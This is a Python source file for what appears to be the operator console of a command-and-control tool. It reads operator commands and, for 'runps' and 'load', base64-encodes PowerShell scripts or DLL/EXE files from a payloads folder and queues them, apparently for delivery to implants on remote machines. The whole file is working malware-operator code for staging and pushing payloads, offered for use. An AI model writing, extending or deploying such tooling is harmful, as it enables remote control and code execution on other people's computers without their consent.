import base64
import os

class Terminal():
    #WORK TO DO LATER move over to pathlib for better support
    payloadspath = os.path.dirname(os.path.realpath(__file__)) + "/../payloads/"
    def listen(self, commands):
        while True:
            try:
                cmd = input()
                splits = cmd.split(" ")
                if splits[0] == "runps":
                    data = open(self.payloadspath + splits[1] + ".ps1","rb").read()
                    b64 = base64.b64encode(data)
                    cmd = b"runps " + b64
                    for each in splits[2:]:
                        cmd = cmd + b" " + each.encode()
                if splits[0] == "load":
                    data = b""
                    try:
                        data = open(self.payloadspath + splits[1] + ".dll","rb").read()
                    except:
                        data = open(self.payloadspath + splits[1] + ".exe","rb").read()
                    b64 = base64.b64encode(data)
                    cmd = b"load " + b64
                commands.put(cmd)
                if cmd == "exit":
                    break
            except KeyboardInterrupt:
                print("KeyboardInterrupt")
                break
            except EOFError:
                print("EOFError")
                break
            except Exception as e:
                print("Exception: " + str(e))
                break